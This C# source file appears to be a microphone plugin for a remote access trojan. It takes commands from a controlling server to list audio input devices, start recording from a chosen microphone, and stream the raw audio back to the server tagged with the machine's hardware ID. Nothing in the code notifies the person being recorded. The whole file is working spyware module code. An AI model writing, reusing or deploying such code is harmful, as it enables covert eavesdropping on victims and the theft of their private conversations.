using MessagePackLib.MessagePack;
using NAudio.Wave;
using System;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        private static WaveInEvent _waveIn;
        private static readonly object _captureLock = new object();
        public static bool IsCapturing { get; private set; }

        /// <summary>
        /// Handles incoming packets from the server.
        /// </summary>
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);

                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "microphone":
                        switch (unpack_msgpack.ForcePathObject("Command").AsString)
                        {
                            case "getMicrophones":
                                GetMicrophones();
                                break;

                            case "capture":
                                {
                                    int deviceIndex = (int)unpack_msgpack.ForcePathObject("DeviceIndex").AsInteger;
                                    StartCapture(deviceIndex);
                                    break;
                                }

                            case "stop":
                                StopCapture();
                                break;
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Microphone Packet.Read: " + ex.Message);
            }
        }

        /// <summary>
        /// Enumerates available recording devices and sends the list to the server.
        /// </summary>
        public static void GetMicrophones()
        {
            try
            {
                var deviceInfo = new StringBuilder();
                int deviceCount = WaveInEvent.DeviceCount;

                for (int i = 0; i < deviceCount; i++)
                {
                    WaveInCapabilities capabilities = WaveInEvent.GetCapabilities(i);
                    deviceInfo.Append(capabilities.ProductName + "->|");
                }

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Command").AsString = "getMicrophones";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("List").AsString = deviceInfo.Length > 0
                    ? deviceInfo.ToString()
                    : "None->|";

                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Microphone GetMicrophones: " + ex.Message);
            }
        }

        /// <summary>
        /// Starts capturing audio from the specified device and streaming it to the server.
        /// </summary>
        public static void StartCapture(int deviceIndex)
        {
            lock (_captureLock)
            {
                if (IsCapturing) return;

                try
                {
                    _waveIn = new WaveInEvent
                    {
                        DeviceNumber = deviceIndex,
                        WaveFormat = new WaveFormat(16000, 16, 1), // 16 kHz, 16-bit, mono
                        BufferMilliseconds = 100
                    };
                    _waveIn.DataAvailable += OnDataAvailable;
                    _waveIn.StartRecording();
                    IsCapturing = true;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Microphone StartCapture: " + ex.Message);
                    _waveIn?.Dispose();
                    _waveIn = null;
                }
            }
        }

        private static void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            try
            {
                if (!Connection.IsConnected || !IsCapturing || e.BytesRecorded == 0) return;

                byte[] audioData = new byte[e.BytesRecorded];
                Buffer.BlockCopy(e.Buffer, 0, audioData, 0, e.BytesRecorded);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "microphone";
                msgpack.ForcePathObject("Command").AsString = "capture";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Data").SetAsBytes(audioData);
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Microphone OnDataAvailable: " + ex.Message);
                new Thread(() =>
                {
                    try { StopCapture(); Connection.Disconnected(); }
                    catch { }
                }).Start();
            }
        }

        /// <summary>
        /// Stops audio capture.
        /// </summary>
        public static void StopCapture()
        {
            lock (_captureLock)
            {
                try
                {
                    IsCapturing = false;
                    if (_waveIn != null)
                    {
                        _waveIn.DataAvailable -= OnDataAvailable;
                        _waveIn.StopRecording();
                        _waveIn.Dispose();
                        _waveIn = null;
                    }
                }
                catch { }
            }
        }
    }
}
